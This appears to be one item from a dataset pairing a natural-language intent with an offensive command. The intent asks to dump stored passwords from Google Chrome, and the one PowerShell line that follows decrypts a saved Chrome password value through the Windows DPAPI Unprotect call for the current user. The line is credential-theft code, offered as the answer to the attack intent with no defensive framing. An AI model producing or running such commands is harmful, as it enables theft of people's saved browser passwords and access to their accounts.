# Natural language intent:
# Dump passwords from Google Chrome browser, The following command extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:

[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
